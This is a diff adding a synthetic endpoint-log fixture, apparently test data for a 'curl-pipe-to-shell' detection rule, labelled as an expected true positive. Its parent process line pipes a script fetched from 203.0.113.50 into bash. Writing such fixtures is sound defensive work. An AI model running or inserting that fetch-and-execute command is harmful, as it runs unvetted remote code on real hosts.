@@ -1,0 +1,81 @@
+{
+  "labels": {
+    "detection_expected_result": "true_positive",
+    "detection_rule": "curl-pipe-to-shell"
+  },
+  "@timestamp": "2025-12-01T14:22:45.123Z",
+  "agent": {
+    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "type": "endpoint",
+    "version": "8.17.0"
+  },
+  "data_stream": {
+    "dataset": "endpoint.events.process",
+    "namespace": "default",
+    "type": "logs"
+  },
+  "ecs": {
+    "version": "8.11.0"
+  },
+  "event": {
+    "action": "exec",
+    "agent_id_status": "verified",
+    "category": "process",
+    "created": "2025-12-01T14:22:45.126Z",
+    "dataset": "endpoint.events.process",
+    "id": "YmFzaC1mcm9tLWN1cmwtcGlwZS0xMjM0NTY=",
+    "ingested": "2025-12-01T14:22:47.000Z",
+    "kind": "event",
+    "module": "endpoint",
+    "outcome": "success",
+    "sequence": 5678001,
+    "type": "start"
+  },
+  "group": {
+    "id": "1000",
+    "name": "devops"
+  },
+  "host": {
+    "id": "srv-web-01-abcdef123456",
+    "name": "srv-web-01",
+    "os": {
+      "type": "linux",
+      "name": "Ubuntu",
+      "version": "22.04"
+    }
+  },
+  "message": "Endpoint process event",
+  "process": {
+    "args": ["bash"],
+    "args_count": 1,
+    "command_line": "bash",
+    "entity_id": "YmFzaC1zaGVsbC1lbnRpdHktaWQ=",
+    "executable": "/usr/bin/bash",
+    "hash": {
+      "sha256": "abc123def456789abc123def456789abc123def456789abc123def456789abcd"
+    },
+    "name": "bash",
+    "parent": {
+      "args": ["curl", "-s", "http://203.0.113.50/install.sh"],
+      "args_count": 3,
+      "command_line": "curl -s http://203.0.113.50/install.sh | bash",
+      "entity_id": "Y3VybC1wYXJlbnQtZW50aXR5LWlk",
+      "executable": "/usr/bin/curl",
+      "name": "curl",
+      "pid": 4521,
+      "start": "2025-12-01T14:22:44.987Z",
+      "user": {
+        "id": "1000",
+        "name": "deploy"
+      },
+      "working_directory": "/tmp"
+    },
+    "pid": 4522,
+    "start": "2025-12-01T14:22:45.123Z",
+    "working_directory": "/tmp"
+  },
+  "user": {
+    "id": "1000",
+    "name": "deploy"
+  }
+}
